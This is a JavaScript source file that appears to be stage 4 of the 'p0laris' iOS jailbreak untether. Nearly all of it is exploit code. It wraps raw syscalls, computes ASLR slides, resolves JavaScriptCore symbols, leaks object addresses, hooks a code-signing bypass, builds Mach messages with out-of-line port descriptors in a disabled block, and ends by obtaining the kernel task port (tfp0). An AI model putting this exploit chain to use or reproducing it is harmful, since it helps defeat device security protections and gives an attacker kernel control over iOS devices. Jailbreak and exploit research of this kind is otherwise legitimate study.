var socket = scall_wrapper("socket");
var htons = scall_wrapper("htons");
var inet_addr = scall_wrapper("inet_addr");
var dup2 = scall_wrapper("dup2");
var bind = scall_wrapper("bind");
var listen = scall_wrapper("listen");
var accept = scall_wrapper("accept");
var close = scall_wrapper("close");
var printf = scall_wrapper("printf");
var reboot = scall_wrapper("reboot");
var AF_INET = 2;
var SOCK_DGRAM = 2;
var SOCK_DGRAM = 2;
var IPPROTO_UDP = 17;
var UNSLID_BASE = 0x4000;

function prep_shit() {
	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	large_buf_ptr = leak_vec(large_buf);
}

function csbypass_wrapper() {
	if (csbypass == undefined) {
		p0laris_log("[*] you're probably running a public build of the untether. i don't have permission to distribute this code yet. sorry.");
		return;
	} else {
		csbypass();
	}
}

function csbypass_stage4() {
	csbypass_wrapper();

	return 0;
}

function main() {
	syslog(LOG_SYSLOG, "__p0laris_LOG_START__");
	p0laris_log("[*] we out here");
	p0laris_log("[*] landed in stage4");

	p0laris_log("[*] p0laris.dyld_shc_slide=0x%08x\n", p0laris.dyld_shc_slide);
	p0laris_log("[*] p0laris.racoon_slide=0x%08x\n", p0laris.racoon_slide);

//	printf = p0laris_log;

	printf("test");

	var dyld_shc_slide = get_dyld_shc_slide();

	sym_cache["JSStringCreateWithUTF8CString"] = JSStringCreateWithUTF8CString + dyld_shc_slide;
	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
	prep_shit();

	if (0) {
		var init_port_set = new mach_msg_ool_ports_descriptor_t(4);
		var addy = init_port_set.addy;
		var init_port_set_obj = init_port_set.deref();
		init_port_set_obj.address = 0x41414141;
		init_port_set_obj.count = 0x42424242;
		init_port_set_obj.disposition = 19;
		init_port_set_obj.deallocate = false;
		init_port_set_obj.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
		init_port_set.write(init_port_set_obj, 0);
		init_port_set.write(init_port_set_obj, 1);
		init_port_set.write(init_port_set_obj, 2);
		init_port_set.write(init_port_set_obj, 3);
		p0laris_log("%s %s %s %s", JSON.stringify(init_port_set.deref(0)),
								   JSON.stringify(init_port_set.deref(1)),
								   JSON.stringify(init_port_set.deref(2)),
								   JSON.stringify(init_port_set.deref(3)));
		
		var Head = new mach_msg_header_t();
		var addy = Head.addy;
		var Head_obj = Head.deref();
		Head_obj.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
		Head_obj.msgh_remote_port = 0x41424344;
		Head_obj.msgh_local_port = 0x45464748;
		Head_obj.msgh_id = 1337;
		Head.write(Head_obj);
		p0laris_log("%s", JSON.stringify(Head.deref()));

		p0laris_log("here");

		var req = new Request_sp(4);
		p0laris_log("here");
		var addy = req.addy;
		p0laris_log("here");
		var req_obj = req.deref();
		p0laris_log("here");

		req_obj.msgh_body.msgh_descriptor_count = 4;
		p0laris_log("here");
		for (var i = 0; i < 4; i++) {
			req_obj.init_port_set[i].address = 0x1234;
			req_obj.init_port_set[i].count = 0x1235;
			req_obj.init_port_set[i].disposition = 19;
			req_obj.init_port_set[i].deallocate = false;
			req_obj.init_port_set[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
		}

		p0laris_log("here");
		req_obj.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
		p0laris_log("here");
		req_obj.Head.msgh_remote_port = 0x41424344;
		p0laris_log("here");
		req_obj.Head.msgh_local_port = 0x45464748;
		p0laris_log("here");
		req_obj.Head.msgh_id = 1337;

		p0laris_log("here");
		req.write(req_obj);
		p0laris_log("here");
		p0laris_log("%s", JSON.stringify(req.deref(), function (key, value) {
			if (typeof value === 'number') {
				return "0x" + value.toString(16);
			}

			return value;
		}, "\t"));
		p0laris_log("here");
	}

	var tfp0 = get_kernel_task();

	syslog(LOG_SYSLOG, "__p0laris_LOG_END__");
	return 0;
}